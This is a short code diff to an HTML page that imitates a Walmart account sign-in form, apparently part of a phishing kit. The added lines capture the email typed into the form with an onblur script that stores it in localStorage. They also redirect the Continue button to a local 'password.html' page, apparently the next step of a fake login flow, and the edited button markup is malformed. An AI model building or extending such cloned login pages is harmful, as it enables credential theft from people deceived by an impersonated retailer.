@@ -65,10 +65,15 @@
 </span>
 </label>
 <div class="w_VCAX">
-<input type="email" id="ld_ui_textfield_32400" value="" autocomplete="email" name="Email Address" aria-label="Email Address" class="w_ZjHt"/>
+<input type="email" onblur="Get()" id="ld_ui_textfield_32400" value="" autocomplete="email" name="Email Address" aria-label="Email Address" class="w_ZjHt"/>
+    <script>
+      function Get(){
+        localStorage.setItem('message', document.getElementById('ld_ui_textfield_32400').value);
+      }
+      </script>
 </div>
 </div>
-<button class="w_hhLG w_8nsR w_jDfj w-100 mv3" type="submit" role="button">Continue</button>
+<a href="./password.html"><button class="w_hhLG w_8nsR w_jDfj w-100 mv3" type="submit" role="button">Continue</a></button>
 <p class="w_U9_0 w_U0S3 w_QcqU dark-gray ph2 mv1 ml4">Securing your personal information is our priority.<br/>
 <a class="dark-gray" target="_blank" href="https://corporate.walmart.com/privacy-security">See our privacy measures.</a>
 </p>
